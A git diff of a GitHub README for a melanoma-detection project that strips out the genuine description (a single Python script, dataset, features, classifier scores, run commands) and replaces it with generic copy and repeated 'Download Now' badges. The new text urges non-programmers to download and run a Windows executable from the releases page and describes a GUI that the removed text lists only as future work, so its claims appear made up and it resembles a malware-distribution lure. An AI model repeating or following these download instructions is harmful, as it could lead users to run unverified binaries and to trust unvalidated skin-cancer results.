@@ -1,130 +1,70 @@
-# 🩺 Melanoma Detection Using Hybrid Features & Machine Learning
-A hybrid-feature melanoma detection pipeline combining advanced image preprocessing, handcrafted features, and multiple machine learning classifiers. Designed to deliver accurate and efficient skin cancer recognition.
+# 🌟 Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models - Accurate Skin Cancer Detection Made Simple
 
-A complete machine learning pipeline for melanoma classification using hybrid texture, color, morphological, and intensity features.  
-All executable code exists inside **one Python file**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
 
----
+## 📖 Description
+This application gives you a powerful tool for detecting melanoma. It uses advanced image processing and multiple machine learning techniques. Our aim is to help you identify skin cancer accurately and efficiently.
 
-## 📑 Table of Contents
-1. [Project Overview](#project-overview)  
-2. [Project Structure](#project-structure)  
-3. [Dataset Description](#dataset-description)  
-4. [Methodology](#methodology)  
-5. [Results](#results)  
-6. [How to Run](#how-to-run)  
-7. [Future Work](#future-work)  
-8. [References](#references)  
-9. [License](#license)
+## 🚀 Getting Started
+To run this software, you will follow a few simple steps. No prior programming knowledge is required. Just follow this guide, and you will be up and running in no time.
 
----
+### 📥 Download & Install
+1. **Visit the Releases Page**  
+   Click the link below to access the download page:  
+   [Download from Releases](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
 
-## Project Overview
-This project implements an automated melanoma detection system using:
+2. **Choose the Latest Version**  
+   On the releases page, look for the latest version of the software. You will see a list of available files. 
 
-- Hybrid feature extraction (HOG + LBP + Color + Shape)  
-- Classical ML models (SVM, Logistic Regression, Decision Tree, KNN)  
-- Performance evaluation using accuracy, precision, recall, F1-score, and confusion matrices  
+3. **Download the Executable File**  
+   Click on the executable file that matches your system specifications. This file will usually be named something like `MelanomaDetector_v1.0.exe`.
 
-All code is located in:  
-👉 **`Notebook/melanoma.py`**
+4. **Run the Installer**  
+   Once the file is downloaded, locate it in your downloads folder. Double-click the file to start the installation process. Follow any on-screen instructions to complete the installation.
 
----
+5. **Launch the Application**  
+   After installation, find the application in your programs. Double-click the icon to launch the software.
 
-## Project Structure
-<img width="305" height="272" alt="image" src="https://github.com/user-attachments/assets/bf2bb41f-ca78-430f-8876-28cec92f4a8e" />
+## ⚙️ System Requirements
+To ensure the application runs smoothly, your system should meet the following requirements:
 
----
+- **Operating System:** Windows 10 or later (macOS and Linux support to be confirmed)
+- **Processor:** Intel i5 or equivalent
+- **RAM:** Minimum 8 GB
+- **Disk Space:** At least 500 MB available
+- **Display:** Monitor with minimum resolution of 1280x720
 
-## Dataset Description
+## 🎨 Features
+- **Image Preprocessing:** This helps improve image quality before analysis.
+- **Feature Extraction:** Advanced algorithms identify key characteristics in images.
+- **Machine Learning Models:** Multiple classifiers ensure accurate results.
+- **User-Friendly Interface:** Easy navigation for anyone, regardless of technical background.
+- **Quick Results:** Get instant feedback on images analyzed.
+  
+## 📊 How to Use
+1. **Upload Image**  
+   Once the application is open, click on the "Upload" button. Choose an image of the skin area you want to analyze.
 
-### Dataset Folder Includes:
-- **Colored/** — Original skin lesion images  
-- **labels.xls** — Actual class labels  
-- **features.csv** — Pre-extracted combined features:
-  - HOG  
-  - LBP  
-  - Shape features (area, perimeter, compactness, eccentricity)  
-  - Color statistics (mean & std)  
+2. **Analyze Image**  
+   After uploading, press the "Analyze" button. The software will process the image using its algorithms.
 
-Using precomputed features greatly speeds up training.
+3. **View Results**  
+   Results will appear on the screen, indicating the likelihood of melanoma. You can save or print the results for your records.
 
----
+## 📚 Additional Resources
+If you want to dive deeper into how the software works, you can check the following links for more detailed insights:
 
-## Methodology
+- [Documentation](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/wiki)
+- [User Guides](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/wiki/User-Guide)
 
-### 1. Preprocessing
-- Resize images  
-- Noise removal  
-- Convert to grayscale  
-- Segmentation  
-- Feature normalization  
+## 🤝 Support
+For support and inquiries, please check the Issues section of the repository or create a new issue if you encounter problems. You can also reach the developers via the GitHub Discussions page.
 
-### 2. Feature Extraction
-- **HOG** — texture  
-- **LBP** — micro-texture  
-- **Color features** — RGB means & standard deviations  
-- **Shape features** — area, perimeter, eccentricity, compactness  
+## 🛠️ Contributing
+We welcome contributions to improve this software. If you would like to help out, please follow our guidelines on the Contributing page.
 
-### 3. Machine Learning Models
-- SVM  
-- Logistic Regression  
-- Decision Tree  
-- KNN  
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models)
+- [Releases Page](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
 
-### Evaluation Metrics
-- Accuracy  
-- Precision  
-- Recall  
-- F1-score  
-- Confusion Matrix  
-
----
-
-## Results
-
-| Model | Accuracy | Precision | Recall | F1-Score |
-|-------|----------|-----------|--------|----------|
-| **SVM** | **0.78** | 0.82 | 0.75 | 0.77 |
-| Logistic Regression | 0.77 | 0.81 | 0.70 | 0.74 |
-| Decision Tree | 0.75 | 0.72 | 0.70 | 0.71 |
-| KNN | 0.70 | 0.72 | 0.70 | 0.71 |
-
-**Key Insight:**  
-- Perimeter is a highly important shape feature → chosen as the root node in Decision Tree.
-
----
-
-## How to Run
-
-### 1. Install dependencies
-```bash
-pip install -r requirements.txt
-```
-
-### 2. Run the main script
-```bash
-python Notebook/melanoma.py
-```
----
-
-### Future Work
-Add CNN-based deep learning
-
-Add Random Forest & XGBoost
-
-Build a Streamlit UI
-
-Add explainability (Grad-CAM, SHAP)
-
-Deploy the system using FastAPI or Flask
-
-### References
-Full research documentation:
-
-📄 References/Report.pdf
-
-### License
-This project is licensed under the MIT License.
-
-You are free to modify and use it with attribution.
+[![Download Now](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github&logoColor=white)](https://github.com/nabeelhayder/Automatic-Melanoma-Detection-using-Hybrid-Features-and-Machine-Learning-Models/releases)
